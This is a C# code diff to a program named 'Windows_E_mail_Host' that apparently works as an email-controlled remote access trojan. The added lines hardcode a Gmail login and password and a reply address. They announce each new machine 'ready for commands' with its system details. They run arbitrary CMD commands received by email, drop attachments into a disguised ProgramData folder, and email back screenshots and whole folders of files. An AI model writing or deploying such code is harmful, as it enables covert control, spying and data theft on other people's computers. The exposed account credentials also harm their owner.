@@ -23,17 +23,64 @@ namespace Windows_E_mail_Host
 {
     class Program
     {
-        private const string Login = "";
-        private const string Password = "";
-        
+        private const string Login = "wisien.kontakt@gmail.com";
+        private const string Password = "3EDCVFR4rfvcde3";
+
+        private const string cmdCommand = "CMD";
+        private const string downloadAtt = "DOWNLOAD ATTACHMENT";
+        private const string makeSS = "MAKE SS";
+        private const string sendFilesFromDirectory = "SEND FOLDER";
         static string SSPatch = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
 
-        static string replyTo;
+        static string replyTo = "wisnia3221@gmail.com";
 
         static void Main(string[] args)
         {
+            StringBuilder start = new StringBuilder(10000);
+            start.Append("============================== MANUAL ==============================");
+            start.AppendLine();
+            start.Append(cmdCommand);
+            start.Append(" - Use CMD - Write any number lines of commands and end with \"END\"");
+            start.AppendLine();
+            start.Append(downloadAtt);
+            start.Append(" - Download all attachments - (possible specified directory) End with \"END\"");
+            start.AppendLine();
+            start.Append(makeSS);
+            start.Append(" - Make Screen Capture and send it");
+            start.AppendLine();
+            start.Append(sendFilesFromDirectory);
+            start.Append(" - Send all files from directory - Write patch to directory and end with \"END\"");
+            start.AppendLine();
+            start.Append("============================== SYSTEM & PLATFORM INFO ==============================");
+            start.AppendLine();
+            start.Append("System: ");
+            start.Append(Environment.OSVersion.VersionString);
+            start.AppendLine();
+            start.Append("64-bit system: ");
+            start.Append(Environment.Is64BitOperatingSystem);
+            start.AppendLine();
+            start.Append("Procesor's cores: ");
+            start.Append(Environment.ProcessorCount);
+            start.AppendLine();
+            start.Append("Version: ");
+            start.Append(Environment.Version);
+            start.AppendLine();
+            start.Append("User Domain Name: ");
+            start.Append(Environment.UserDomainName);
+
+            sendEmail("New Machine is Ready For  commands", start.ToString(), null);
             System.Threading.Timer checkForNewMail = new System.Threading.Timer(CheckForMail, null, 0, 10000);
+
+            Microsoft.Win32.SystemEvents.SessionEnding += new Microsoft.Win32.SessionEndingEventHandler(TurnOff);
+
+
+
             Application.Run();
+        }
+
+        static void TurnOff(object o, Microsoft.Win32.SessionEndingEventArgs e)
+        {
+            sendEmail("Session ended", "", null);
         }
         
         static void CheckForMail(object o)
@@ -63,7 +110,7 @@ namespace Windows_E_mail_Host
                     {
                         switch (EmailLines[line])
                         {
-                            case "CMD":
+                            case cmdCommand:
                                 List<string> commands = new List<string>();
                                 for (int j = line + 1; j < EmailLines.Length; j++)
                                 {
@@ -77,7 +124,7 @@ namespace Windows_E_mail_Host
                                 sendEmail("CMD Return", UseCMD(commands), null);
                                 break;
 
-                            case "DOWNLOAD ATTACHMENT":
+                            case downloadAtt:
 
                                 string dpatch = @"C:\ProgramData\SystemData\";
                                 line++;
@@ -88,7 +135,7 @@ namespace Windows_E_mail_Host
                                     email.Attachments.StoreToFolder(dpatch);
 
                                 break;
-                            case "MAKE SS":
+                            case makeSS:
                                 string ssname = MakeScreenCapture();
                                 sendEmail("Screen captured", "", new[] { ssname });
                                 GC.Collect();
@@ -97,7 +144,7 @@ namespace Windows_E_mail_Host
                                 File.Delete(ssname);
 
                                 break;
-                            case "SEND FOLDER":
+                            case sendFilesFromDirectory:
                                 string spatch = @"C:\ProgramData\SystemData\";
                                 line++;
                                 if (EmailLines[line] != "END") spatch = EmailLines[line];
